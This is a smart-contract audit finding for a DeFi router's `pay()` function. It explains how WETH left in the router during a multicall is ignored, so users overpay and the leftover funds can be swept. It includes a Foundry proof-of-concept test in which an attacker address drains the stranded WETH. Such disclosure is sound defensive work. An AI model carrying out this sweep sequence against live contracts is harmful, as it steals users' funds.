### Title
`PeripheryPayments::pay()` ignores the router's existing WETH token balance when settling a WETH swap, causing the user to overpay and leaving WETH stranded and stealable — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`PeripheryPayments.pay()` handles WETH settlement by checking only the router's **native ETH balance** (`address(this).balance`). It never checks the router's **WETH token balance** (`IERC20(WETH).balanceOf(address(this))`). When a multicall deposits WETH into the router in one step and a subsequent step needs to pay WETH, the existing WETH is silently ignored and the full amount is pulled from the user's wallet instead. The stranded WETH is then freely sweepable by any caller via the permissionless `sweepToken`.

---

### Finding Description

`pay()` in `PeripheryPayments.sol` has three branches for WETH:

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;          // only ETH checked
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance); // ← ignores router WETH
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);                 // ← ignores router WETH
    }
}
``` [1](#0-0) 

In both the `else if (nativeBalance > 0)` and `else` branches, the code pulls the full remaining amount from `payer` without first consuming any WETH tokens the router already holds. The `payer == address(this)` guard at line 71 only fires for intermediate hops inside a single `exactInput` call; it does **not** fire for the first hop of any swap or for any `exactInputSingle` / `exactOutputSingle` call, even inside a multicall. [2](#0-1) 

The router accumulates WETH whenever a swap's `recipient` is set to `address(router)` — the documented pattern for chaining swaps in a multicall (e.g., `token1 → WETH → token2`). The test suite itself demonstrates this pattern: [3](#0-2) 

In `exactInputSingle`, the payer is always hardcoded to `msg.sender`: [4](#0-3) 

So when a second `exactInputSingle(tokenIn=WETH)` call runs inside the same multicall, `pay()` is invoked with `payer = msg.sender` (the user), not `address(this)`, and the router's WETH balance is never consulted.

`sweepToken` is permissionless — any address can drain the stranded WETH to an arbitrary `recipient`: [5](#0-4) 

---

### Impact Explanation

**Direct loss of user principal.** In the multicall sequence below:

1. `exactInputSingle(tokenIn=token1, tokenOut=WETH, amountIn=X, recipient=address(router))` — router receives `W` WETH.
2. `exactInputSingle(tokenIn=WETH, tokenOut=token2, amountIn=W, recipient=user)` — callback calls `pay(WETH, swapper, pool, W)`.

Step 2 pulls `W` WETH from the user's wallet (ignoring the `W` WETH already in the router). The router retains `W` WETH. Any third party immediately calls `sweepToken(WETH, 0, attacker)` and steals it. The user has paid `W` WETH twice for a single swap leg.

The same over-pull occurs in the partial-ETH branch: if the router holds `nativeBalance` ETH **and** `wethBalance` WETH tokens, the code wraps only the ETH and pulls `value - nativeBalance` from the payer, ignoring `wethBalance` entirely.

---

### Likelihood Explanation

The multicall pattern of routing WETH output to `address(router)` and then consuming it in a subsequent call is the **documented and tested** usage pattern for ETH output flows (see `test_multicall_tokenForWeth_thenUnwrapEth`). Any integrator or user who adapts this pattern for a WETH-input second hop triggers the bug without any privileged access or malicious setup. A MEV bot monitoring the mempool can front-run the multicall or back-run it to sweep the stranded WETH.

---

### Recommendation

Before pulling from `payer`, consume the router's existing WETH token balance:

```solidity
} else if (token == WETH) {
    uint256 wethBalance = IERC20(WETH).balanceOf(address(this)); // add this
    uint256 nativeBalance = address(this).balance;
    uint256 totalAvailable = wethBalance + nativeBalance;        // add this

    if (totalAvailable >= value) {
        // Use existing WETH first, then wrap ETH for the remainder
        uint256 fromEth = value > wethBalance ? value - wethBalance : 0;
        if (fromEth > 0) {
            IWETH9(WETH).deposit{value: fromEth}();
        }
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (totalAvailable > 0) {
        uint256 fromEth = nativeBalance;
        if (fromEth > 0) IWETH9(WETH).deposit{value: fromEth}();
        IERC20(WETH).safeTransfer(recipient, totalAvailable);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - totalAvailable);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
```

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Setup: pool01 (token1/WETH), pool02 (WETH/token2), both seeded with liquidity.
// swapper has token1 and WETH approved to router.

function test_poc_wethBalanceIgnored_userOverpays() public {
    uint128 amountIn1 = 3_000;   // token1 → WETH, output goes to router

    // Step 1: quote how much WETH we get from swapping amountIn1 token1
    // Assume the pool returns W WETH for amountIn1 token1.
    uint128 W = /* quoted output */ 2_800;

    uint256 swapperWethBefore = weth.balanceOf(swapper);
    uint256 swapperToken1Before = token1.balanceOf(swapper);

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);

    // Call 1: token1 → WETH, output to router
    calls[0] = abi.encodeWithSelector(
        router.exactInputSingle.selector,
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool01),
            tokenIn: address(token1),
            tokenOut: address(weth),
            zeroForOne: false,
            amountIn: amountIn1,
            amountOutMinimum: 0,
            recipient: address(router),   // WETH lands on router
            deadline: block.timestamp + 1,
            priceLimitX64: type(uint128).max,
            extensionData: ""
        })
    );

    // Call 2: WETH → token2, amountIn = W (should use router's WETH)
    calls[1] = abi.encodeWithSelector(
        router.exactInputSingle.selector,
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool02),
            tokenIn: address(weth),
            tokenOut: address(token2),
            zeroForOne: true,
            amountIn: W,
            amountOutMinimum: 0,
            recipient: swapper,
            deadline: block.timestamp + 1,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    router.multicall(calls);

    // BUG: router still holds W WETH (from call 1), and swapper paid W WETH from wallet (for call 2)
    assertEq(weth.balanceOf(address(router)), W, "router holds stranded WETH");
    assertEq(swapperWethBefore - weth.balanceOf(swapper), W, "swapper overpaid W WETH from wallet");

    // Attacker steals stranded WETH
    address attacker = address(0xdead);
    router.sweepToken(address(weth), 0, attacker);
    assertEq(weth.balanceOf(attacker), W, "attacker stole router WETH");
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L48-55)
```text
  function sweepToken(address token, uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceToken = IERC20(token).balanceOf(address(this));
    if (balanceToken < amountMinimum) revert InsufficientToken(token, amountMinimum, balanceToken);

    if (balanceToken > 0) {
      IERC20(token).safeTransfer(recipient, balanceToken);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L69-88)
```text
  function pay(address token, address payer, address recipient, uint256 value) internal {
    // If the payer is contract it means we are in the middle of a path. In the middle of a path we operate on ERC20 only.
    if (payer == address(this)) {
      IERC20(token).safeTransfer(recipient, value);
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L135-162)
```text
  function test_multicall_tokenForWeth_thenUnwrapEth() public {
    uint128 amountIn = 3_000;
    uint256 recipientEthBefore = recipient.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(token1),
        tokenOut: address(weth),
        zeroForOne: false,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: address(router),
        deadline: _deadline(),
        priceLimitX64: type(uint128).max,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.unwrapWETH9.selector, uint256(0), recipient);
    router.multicall(calls);

    assertGt(recipient.balance, recipientEthBefore, "recipient received eth");
    assertEq(weth.balanceOf(address(router)), 0, "router weth cleared");
    assertEq(address(router).balance, 0, "router eth cleared");
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L71-71)
```text
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
```
